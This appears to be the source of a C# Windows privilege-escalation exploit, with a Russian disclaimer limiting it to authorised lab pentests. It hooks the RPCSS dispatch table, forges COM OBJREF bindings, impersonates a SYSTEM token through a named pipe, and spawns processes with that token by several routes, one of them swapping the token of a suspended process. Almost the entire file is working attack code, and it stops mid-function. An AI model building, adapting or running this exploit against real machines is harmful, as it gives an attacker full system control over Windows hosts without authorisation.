/*
 * ============================================================================
 * MyApp v2.0 — single-file RPCSS hook
 * ============================================================================
 * Триггер: RPCSS dispatch-table hook на orcbRPC (combase.dll).
 *
 * DISCLAIMER: только для согласованного пентеста изолированных лабораторий.
 * ============================================================================
 */

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace MyApp
{
    // ========================================================================
    // LOG
    // ========================================================================
    static class Log
    {
        public static void Info(string m) { Console.WriteLine("[*] " + m); }
        public static void Ok(string m)   { Console.WriteLine("[+] " + m); }
        public static void Warn(string m) { Console.WriteLine("[!] " + m); }
        public static void Fail(string m) { Console.WriteLine("[-] " + m); }

        public static string LastErr()
        {
            int e = Marshal.GetLastWin32Error();
            return "err=" + e + " (" + new System.ComponentModel.Win32Exception(e).Message + ")";
        }
    }

    // ========================================================================
    // CONST
    // ========================================================================
    static class K
    {
        // --- pipe ---
        public const int  PIPE_ACCESS_DUPLEX       = 0x00000003;
        public const int  PIPE_TYPE_BYTE           = 0x00000000;
        public const int  PIPE_READMODE_BYTE       = 0x00000000;
        public const int  PIPE_WAIT                = 0x00000000;
        public const int  PIPE_UNLIMITED_INSTANCES = 255;
        public const uint ERROR_PIPE_CONNECTED     = 535;

        // --- process ---
        public const uint CREATE_NO_WINDOW           = 0x08000000;
        public const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        public const uint CREATE_SUSPENDED           = 0x00000004;
        public const uint STARTF_USESTDHANDLES       = 0x00000100;
        public const uint LOGON_WITH_PROFILE         = 0x00000001;
        public const uint HANDLE_FLAG_INHERIT        = 0x00000001;

        // --- token access ---
        public const uint TOKEN_ASSIGN_PRIMARY    = 0x0001;
        public const uint TOKEN_DUPLICATE         = 0x0002;
        public const uint TOKEN_IMPERSONATE       = 0x0004;
        public const uint TOKEN_QUERY             = 0x0008;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        public const uint TOKEN_ADJUST_DEFAULT    = 0x0080;
        public const uint TOKEN_ADJUST_SESSIONID  = 0x0100;

        public const uint TOKEN_PRIMARY_REQUIRED =
            TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY |
            TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_ADJUST_PRIVILEGES;

        public const uint SE_PRIVILEGE_ENABLED = 0x00000002;

        // --- token info class ---
        public const int TokenUser = 1;
        public const int TokenPrivileges = 3;
        public const int TokenType = 8;
        public const int TokenImpersonationLevel = 9;
        public const int TokenSessionId = 12;
        public const int TokenIntegrityLevel = 25;
        public const int TokenElevationType = 18;

        public const int SecurityImpersonation = 2;
        public const int TokenPrimaryType = 1;

        // --- errors ---
        public const int ERROR_INSUFFICIENT_BUFFER = 122;
        public const int ERROR_NOT_ALL_ASSIGNED = 1300;

        // --- misc ---
        public const uint STATUS_SUCCESS = 0;
        public const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

        public const uint SECURITY_MANDATORY_SYSTEM_RID = 0x4000;
        public const string SYSTEM_SID = "S-1-5-18";
    }

    // ========================================================================
    // STRUCTS — RPC / COM
    // ========================================================================
    [StructLayout(LayoutKind.Sequential)]
    struct RPC_VERSION { public ushort MajorVersion; public ushort MinorVersion; }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SYNTAX_IDENTIFIER
    {
        public Guid SyntaxGUID;
        public RPC_VERSION SyntaxVersion;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SERVER_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr RpcProtseqEndpoint;
        public IntPtr DefaultManagerEpv;
        public IntPtr InterpreterInfo;
        public uint Flags;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_DISPATCH_TABLE
    {
        public uint DispatchTableCount;
        public IntPtr DispatchTable;
        public IntPtr Reserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct MIDL_SERVER_INFO
    {
        public IntPtr pStubDesc;
        public IntPtr DispatchTable;
        public IntPtr ProcString;
        public IntPtr FmtStringOffset;
        public IntPtr ThunkTable;
        public IntPtr pTransferSyntax;
        public IntPtr nCount;
        public IntPtr pSyntaxInfo;
    }

    // ========================================================================
    // STRUCTS — WIN32
    // ========================================================================
    [StructLayout(LayoutKind.Sequential)]
    struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr pSecurityDescriptor;
        [MarshalAs(UnmanagedType.Bool)] public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_USER { public SID_AND_ATTRIBUTES User; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_MANDATORY_LABEL { public SID_AND_ATTRIBUTES Label; }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }

    // ========================================================================
    // NATIVE P/Invoke
    // ========================================================================
    static class N
    {
        // --- kernel32 ---
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode,
            EntryPoint = "CreateNamedPipeW")]
        public static extern IntPtr CreateNamedPipe(
            string name, int openMode, int pipeMode, int maxInstances,
            int outBuf, int inBuf, int timeout, ref SECURITY_ATTRIBUTES sa);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConnectNamedPipe(IntPtr hPipe, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DisconnectNamedPipe(IntPtr hPipe);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr h);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool VirtualProtect(IntPtr p, uint size, uint newProt, out uint oldProt);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LocalFree(IntPtr h);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode,
            EntryPoint = "CreateFileW")]
        public static extern IntPtr CreateFileW(
            string name, uint access, FileShare share, IntPtr sa,
            FileMode disp, uint flags, IntPtr templ);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessW(
            string app, StringBuilder cmd, IntPtr pa, IntPtr ta, bool inherit,
            uint flags, IntPtr env, string curDir,
            ref STARTUPINFO si, out PROCESS_INFORMATION pi);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetHandleInformation(IntPtr h, uint mask, uint flags);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreatePipe(out IntPtr rd, out IntPtr wr,
            ref SECURITY_ATTRIBUTES sa, int size);

        // --- advapi32 ---
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ImpersonateNamedPipeClient(IntPtr hPipe);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenProcessToken(IntPtr hProc, uint access, out IntPtr hTok);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool OpenThreadToken(IntPtr hThread, uint access,
            [MarshalAs(UnmanagedType.Bool)] bool asSelf, out IntPtr hTok);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DuplicateTokenEx(IntPtr hTok, uint access, IntPtr attrs,
            int impLevel, int tokType, out IntPtr phNew);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetTokenInformation(IntPtr hTok, int cls, IntPtr info,
            int len, out int retLen);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SetTokenInformation(IntPtr hTok, int cls,
            ref uint info, int len);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AdjustTokenPrivileges(IntPtr hTok, bool disableAll,
            ref TOKEN_PRIVILEGES newState, int bufLen, IntPtr prevState, IntPtr retLen);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string sys, string name, out LUID luid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
            string sddl, uint rev, out IntPtr sd, out uint sdSize);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ConvertSidToStringSid(IntPtr sid, out string str);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthorityCount(IntPtr sid);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern IntPtr GetSidSubAuthority(IntPtr sid, uint n);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsValidSid(IntPtr sid);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hTok, uint logonFlags, string app, string cmd,
            uint flags, IntPtr env, string curDir,
            ref STARTUPINFO si, out PROCESS_INFORMATION pi);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CreateProcessAsUserW(
            IntPtr hTok, string app, string cmd, IntPtr pa, IntPtr ta,
            bool inherit, uint flags, IntPtr env, string curDir,
            ref STARTUPINFO si, out PROCESS_INFORMATION pi);

        // --- ntdll ---
        [DllImport("ntdll.dll")]
        public static extern uint NtResumeProcess(IntPtr hProcess);

        [DllImport("ntdll.dll")]
        public static extern uint NtSetInformationProcess(IntPtr hProcess,
            int cls, IntPtr info, uint len);

        // --- ole32 ---
        [DllImport("ole32.dll")]
        public static extern int CoUnmarshalInterface(IStream stm, ref Guid riid, out IntPtr ppv);

        [DllImport("ole32.dll")]
        public static extern int CreateBindCtx(uint reserved, out IBindCtx ppbc);

        [DllImport("ole32.dll")]
        public static extern int CreateObjrefMoniker(IntPtr pUnk, out IMoniker ppmk);

        // --- oleaut32 ---
        [DllImport("oleaut32.dll")]
        public static extern int CreateStreamOnHGlobal(IntPtr hGlobal, bool fDeleteOnRelease,
            out IStream ppstm);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GlobalAlloc(uint flags, IntPtr bytes);
    }

    // ========================================================================
    // SUNDAY SEARCH
    // ========================================================================
    static class Sunday
    {
        const int ALPHABET = 256;

        static int[] BuildTable(byte[] pattern)
        {
            int[] t = new int[ALPHABET];
            for (int i = 0; i < ALPHABET; i++) t[i] = -1;
            for (int i = 0; i < pattern.Length; i++) t[pattern[i]] = i;
            return t;
        }

        public static List<int> Search(byte[] text, byte[] pattern)
        {
            List<int> matches = new List<int>();
            if (pattern.Length == 0 || text.Length < pattern.Length) return matches;

            int[] shift = BuildTable(pattern);
            int i = 0;
            while (i <= text.Length - pattern.Length)
            {
                int j = 0;
                while (j < pattern.Length && text[i + j] == pattern[j]) j++;
                if (j == pattern.Length) matches.Add(i);

                i += pattern.Length;
                if (i < text.Length)
                {
                    int s = shift[text[i]];
                    i -= (s < 0 ? -1 : s);
                }
            }
            return matches;
        }
    }

    // ========================================================================
    // OBJREF
    // ========================================================================
    public enum TowerProtocol : ushort
    {
        EPM_PROTOCOL_TCP = 0x07,
        EPM_PROTOCOL_NCACN = 0x0b,
        EPM_PROTOCOL_NCALRPC = 0x0c,
        EPM_PROTOCOL_NP = 0x10,
    }

    internal class ObjRef
    {
        const uint Signature = 0x574F454D;

        public readonly Guid Guid;
        public readonly Standard StandardObjRef;

        public ObjRef(Guid guid, Standard standard)
        {
            Guid = guid;
            StandardObjRef = standard;
        }

        public ObjRef(byte[] bytes)
        {
            BinaryReader br = new BinaryReader(new MemoryStream(bytes), Encoding.Unicode);
            if (br.ReadUInt32() != Signature)
                throw new InvalidDataException("not an OBJREF stream");
            uint flags = br.ReadUInt32();
            Guid = new Guid(br.ReadBytes(16));
            if (flags == 1) StandardObjRef = new Standard(br);
        }

        public byte[] GetBytes()
        {
            BinaryWriter bw = new BinaryWriter(new MemoryStream());
            bw.Write(Signature);
            bw.Write((uint)1);
            bw.Write(Guid.ToByteArray());
            StandardObjRef.Save(bw);
            return ((MemoryStream)bw.BaseStream).ToArray();
        }

        internal class SecurityBinding
        {
            public readonly ushort AuthnSvc;
            public readonly ushort AuthzSvc;
            public readonly string PrincipalName;

            public SecurityBinding(ushort a, ushort z, string p)
            {
                AuthnSvc = a; AuthzSvc = z; PrincipalName = p;
            }

            public SecurityBinding(BinaryReader br)
            {
                AuthnSvc = br.ReadUInt16();
                AuthzSvc = br.ReadUInt16();
                string s = "";
                char c;
                while ((c = br.ReadChar()) != 0) s += c;
                br.ReadChar();
                PrincipalName = s;
            }

            public byte[] GetBytes()
            {
                BinaryWriter bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);
                bw.Write(AuthnSvc);
                bw.Write(AuthzSvc);
                if (!string.IsNullOrEmpty(PrincipalName))
                    bw.Write(Encoding.Unicode.GetBytes(PrincipalName));
                bw.Write((char)0);
                bw.Write((char)0);
                return ((MemoryStream)bw.BaseStream).ToArray();
            }
        }

        internal class StringBinding
        {
            public readonly TowerProtocol TowerID;
            public readonly string NetworkAddress;

            public StringBinding(TowerProtocol t, string n) { TowerID = t; NetworkAddress = n; }

            public StringBinding(BinaryReader br)
            {
                TowerID = (TowerProtocol)br.ReadUInt16();
                string s = "";
                char c;
                while ((c = br.ReadChar()) != 0) s += c;
                br.ReadChar();
                NetworkAddress = s;
            }

            public byte[] GetBytes()
            {
                BinaryWriter bw = new BinaryWriter(new MemoryStream(), Encoding.Unicode);
                bw.Write((ushort)TowerID);
                bw.Write(Encoding.Unicode.GetBytes(NetworkAddress));
                bw.Write((char)0);
                bw.Write((char)0);
                return ((MemoryStream)bw.BaseStream).ToArray();
            }
        }

        internal class DualStringArray
        {
            public readonly StringBinding StringBinding;
            public readonly SecurityBinding SecurityBinding;
            ushort NumEntries;
            ushort SecurityOffset;

            public DualStringArray(StringBinding sb, SecurityBinding sec)
            {
                StringBinding = sb;
                SecurityBinding = sec;
                byte[] a = sb.GetBytes();
                byte[] b = sec.GetBytes();
                NumEntries = (ushort)((a.Length + b.Length) / 2);
                SecurityOffset = (ushort)(a.Length / 2);
            }

            public DualStringArray(BinaryReader br)
            {
                NumEntries = br.ReadUInt16();
                SecurityOffset = br.ReadUInt16();
                StringBinding = new StringBinding(br);
                SecurityBinding = new SecurityBinding(br);
            }

            public void Save(BinaryWriter bw)
            {
                byte[] a = StringBinding.GetBytes();
                byte[] b = SecurityBinding.GetBytes();
                bw.Write((ushort)((a.Length + b.Length) / 2));
                bw.Write((ushort)(a.Length / 2));
                bw.Write(a);
                bw.Write(b);
            }
        }

        internal class Standard
        {
            public readonly uint Flags, PublicRefs;
            public readonly ulong OXID, OID;
            public readonly Guid IPID;
            public readonly DualStringArray DualStringArray;

            public Standard(uint flags, uint refs, ulong oxid, ulong oid,
                Guid ipid, DualStringArray dsa)
            {
                Flags = flags; PublicRefs = refs;
                OXID = oxid; OID = oid; IPID = ipid;
                DualStringArray = dsa;
            }

            public Standard(BinaryReader br)
            {
                Flags = br.ReadUInt32();
                PublicRefs = br.ReadUInt32();
                OXID = br.ReadUInt64();
                OID = br.ReadUInt64();
                IPID = new Guid(br.ReadBytes(16));
                DualStringArray = new DualStringArray(br);
            }

            public void Save(BinaryWriter bw)
            {
                bw.Write(Flags);
                bw.Write(PublicRefs);
                bw.Write(OXID);
                bw.Write(OID);
                bw.Write(IPID.ToByteArray());
                DualStringArray.Save(bw);
            }
        }
    }

    // ========================================================================
    // IStreamImpl
    // ========================================================================
    class IStreamImpl : IStream, IDisposable
    {
        private Stream _s;
        public IStreamImpl(Stream s) { _s = s; }

        public void Dispose() { _s.Dispose(); }
        public void Close()   { _s.Dispose(); }

        public void Clone(out IStream pStm) { throw new NotImplementedException(); }
        public void Commit(int g) { throw new NotImplementedException(); }
        public void CopyTo(IStream p, long cb, IntPtr rd, IntPtr wr) { throw new NotImplementedException(); }
        public void LockRegion(long o, long cb, int t) { throw new NotImplementedException(); }
        public void Revert() { throw new NotImplementedException(); }
        public void SetSize(long s) { throw new NotImplementedException(); }
        public void UnlockRegion(long o, long cb, int t) { throw new NotImplementedException(); }

        public void Stat(out System.Runtime.InteropServices.ComTypes.STATSTG st, int f)
        {
            st = new System.Runtime.InteropServices.ComTypes.STATSTG();
            st.cbSize = _s.Length;
        }

        public void Seek(long d, int origin, IntPtr newPos)
        {
            SeekOrigin so;
            switch (origin)
            {
                case 0: so = SeekOrigin.Begin; break;
                case 1: so = SeekOrigin.Current; break;
                case 2: so = SeekOrigin.End; break;
                default: throw new ArgumentException();
            }
            _s.Seek(d, so);
            if (newPos != IntPtr.Zero) Marshal.WriteInt64(newPos, _s.Position);
        }

        public void Read(byte[] buf, int cb, IntPtr read)
        {
            int n = _s.Read(buf, 0, cb);
            if (read != IntPtr.Zero) Marshal.WriteInt32(read, n);
        }

        public void Write(byte[] buf, int cb, IntPtr written)
        {
            _s.Write(buf, 0, cb);
            if (written != IntPtr.Zero) Marshal.WriteInt32(written, cb);
        }
    }

    // ========================================================================
    // NEW ORCB RPC
    // ========================================================================
    class NewOrcbRPC
    {
        private readonly MyAppContext _ctx;

        public NewOrcbRPC(MyAppContext ctx) { _ctx = ctx; }

        private int Build(int ppdsaNewBindings)
        {
            string[] endpoints = new string[]
            {
                _ctx.ClientEndpoint,
                "ncacn_ip_tcp:999.999.999.999"
            };

            int entrySize = 3;
            foreach (var e in endpoints) entrySize += e.Length + 1;

            int memSize = entrySize * 2 + 16;
            IntPtr buf = Marshal.AllocHGlobal(memSize);

            byte[] zero = new byte[memSize];
            Marshal.Copy(zero, 0, buf, memSize);

            int off = 0;
            Marshal.WriteInt16(buf, off, (short)entrySize); off += 2;
            Marshal.WriteInt16(buf, off, (short)(entrySize - 2)); off += 2;

            foreach (var e in endpoints)
            {
                foreach (char ch in e)
                {
                    Marshal.WriteInt16(buf, off, (short)ch);
                    off += 2;
                }
                off += 2;
            }

            Marshal.WriteIntPtr(new IntPtr(ppdsaNewBindings), buf);
            return 0;
        }

        public delegate int D4(IntPtr a, IntPtr b, IntPtr c, IntPtr d);
        public delegate int D5(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e);
        public delegate int D6(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f);
        public delegate int D7(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g);
        public delegate int D8(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h);
        public delegate int D9(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i);
        public delegate int D10(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j);
        public delegate int D11(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k);
        public delegate int D12(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l);
        public delegate int D13(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m);
        public delegate int D14(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m, IntPtr n);

        public int F4(IntPtr a, IntPtr b, IntPtr c, IntPtr d) { return Build((int)c); }
        public int F5(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e) { return Build((int)d); }
        public int F6(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f) { return Build((int)e); }
        public int F7(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g) { return Build((int)f); }
        public int F8(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h) { return Build((int)g); }
        public int F9(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i) { return Build((int)h); }
        public int F10(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j) { return Build((int)i); }
        public int F11(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k) { return Build((int)j); }
        public int F12(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l) { return Build((int)k); }
        public int F13(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m) { return Build((int)l); }
        public int F14(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m, IntPtr n) { return Build((int)m); }
    }

    // ========================================================================
    // TOKEN HELPERS
    // ========================================================================
    static class Tok
    {
        public static bool EnablePrivilege(string name)
        {
            IntPtr hTok = IntPtr.Zero;
            try
            {
                if (!N.OpenProcessToken(N.GetCurrentProcess(),
                    K.TOKEN_QUERY | K.TOKEN_ADJUST_PRIVILEGES, out hTok))
                { Log.Warn("OpenProcessToken: " + Log.LastErr()); return false; }

                LUID luid;
                if (!N.LookupPrivilegeValue(null, name, out luid))
                { Log.Warn("LookupPrivilegeValue: " + Log.LastErr()); return false; }

                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges.Luid = luid;
                tp.Privileges.Attributes = K.SE_PRIVILEGE_ENABLED;

                N.AdjustTokenPrivileges(hTok, false, ref tp,
                    Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (Marshal.GetLastWin32Error() == K.ERROR_NOT_ALL_ASSIGNED)
                { Log.Warn(name + " not held by current token"); return false; }
                return true;
            }
            finally { if (hTok != IntPtr.Zero) N.CloseHandle(hTok); }
        }

        public static string GetSid(IntPtr hTok)
        {
            int len = 0;
            N.GetTokenInformation(hTok, K.TokenUser, IntPtr.Zero, 0, out len);
            if (Marshal.GetLastWin32Error() != K.ERROR_INSUFFICIENT_BUFFER || len == 0)
                return null;

            IntPtr buf = Marshal.AllocHGlobal(len);
            try
            {
                if (!N.GetTokenInformation(hTok, K.TokenUser, buf, len, out len)) return null;
                TOKEN_USER tu = (TOKEN_USER)Marshal.PtrToStructure(buf, typeof(TOKEN_USER));
                if (!N.IsValidSid(tu.User.Sid)) return null;
                string s;
                return N.ConvertSidToStringSid(tu.User.Sid, out s) ? s : null;
            }
            finally { Marshal.FreeHGlobal(buf); }
        }

        public static string GetIL(IntPtr hTok)
        {
            int len = 0;
            N.GetTokenInformation(hTok, K.TokenIntegrityLevel, IntPtr.Zero, 0, out len);
            if (Marshal.GetLastWin32Error() != K.ERROR_INSUFFICIENT_BUFFER || len == 0)
                return "?";

            IntPtr buf = Marshal.AllocHGlobal(len);
            try
            {
                if (!N.GetTokenInformation(hTok, K.TokenIntegrityLevel, buf, len, out len))
                    return "?";
                TOKEN_MANDATORY_LABEL ml =
                    (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(buf, typeof(TOKEN_MANDATORY_LABEL));
                if (!N.IsValidSid(ml.Label.Sid)) return "?";

                IntPtr cntP = N.GetSidSubAuthorityCount(ml.Label.Sid);
                byte cnt = Marshal.ReadByte(cntP);
                IntPtr ridP = N.GetSidSubAuthority(ml.Label.Sid, (uint)(cnt - 1));
                uint rid = (uint)Marshal.ReadInt32(ridP);

                if (rid >= K.SECURITY_MANDATORY_SYSTEM_RID) return "SYSTEM";
                if (rid >= 0x3000) return "HIGH";
                if (rid >= 0x2000) return "MEDIUM";
                if (rid >= 0x1000) return "LOW";
                return "RID:" + rid;
            }
            finally { Marshal.FreeHGlobal(buf); }
        }

        public static bool SpawnProcess(IntPtr hImpTok, string commandLine,
            out PROCESS_INFORMATION pi)
        {
            pi = new PROCESS_INFORMATION();

            IntPtr hPrimary = IntPtr.Zero;
            if (!N.DuplicateTokenEx(hImpTok, K.TOKEN_PRIMARY_REQUIRED, IntPtr.Zero,
                K.SecurityImpersonation, K.TokenPrimaryType, out hPrimary))
            {
                Log.Fail("DuplicateTokenEx: " + Log.LastErr());
                return false;
            }

            try
            {
                uint mySession = (uint)Process.GetCurrentProcess().SessionId;
                if (!N.SetTokenInformation(hPrimary, K.TokenSessionId, ref mySession,
                    sizeof(uint)))
                {
                    Log.Warn("SetTokenInformation(TokenSessionId): " + Log.LastErr());
                }

                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                si.lpDesktop = "winsta0\\default";

                if (N.CreateProcessWithTokenW(hPrimary, K.LOGON_WITH_PROFILE, null,
                    commandLine, K.CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi))
                {
                    Log.Ok("Process launched via CreateProcessWithTokenW. PID=" + pi.dwProcessId);
                    return true;
                }

                int err = Marshal.GetLastWin32Error();
                Log.Warn("CreateProcessWithTokenW: err=" + err);

                if (N.CreateProcessAsUserW(hPrimary, null, commandLine, IntPtr.Zero,
                    IntPtr.Zero, false, K.CREATE_NO_WINDOW, IntPtr.Zero, null,
                    ref si, out pi))
                {
                    Log.Ok("Process launched via CreateProcessAsUserW. PID=" + pi.dwProcessId);
                    return true;
                }

                err = Marshal.GetLastWin32Error();
                Log.Fail("CreateProcessAsUserW: err=" + err);

                Log.Info("Trying NtSetInformationProcess fallback...");
                return SpawnFallback(hPrimary, commandLine, out pi);
            }
            finally { if (hPrimary != IntPtr.Zero) N.CloseHandle(hPrimary); }
        }

        static bool SpawnFallback(IntPtr hPrimary, string commandLine, out PROCESS_INFORMATION pi)
        {
            pi = new PROCESS_INFORMATION();

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            si.lpDesktop = "winsta0\\default";

            StringBuilder cmd = new StringBuilder(commandLine);
            uint flags = K.CREATE_NO_WINDOW | K.CREATE_SUSPENDED | K.CREATE_UNICODE_ENVIRONMENT;

            if (!N.CreateProcessW(null, cmd, IntPtr.Zero, IntPtr.Zero, false,
                flags, IntPtr.Zero, null, ref si, out pi))
            {
                Log.Fail("CreateProcessW (suspended): " + Log.LastErr());
                return false;
            }

            IntPtr pat = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)) * 2);
            try
            {
                Marshal.WriteIntPtr(pat, 0, hPrimary);
                Marshal.WriteIntPtr(pat, Marshal.SizeOf(typeof(IntPtr)), pi.hThread);

                uint st = N.NtSetInformationProcess(pi.hProcess, 9,
                    pat, (uint)(Marshal.SizeOf(typeof(IntPtr)) * 2));

                if (st != K.STATUS_SUCCESS)
                {
                    Log.Fail("NtSetInformationProcess: 0x" + st.ToString("X8"));
                    N.CloseHandle(pi.hThread);
                    N.CloseHandle(pi.hProcess);
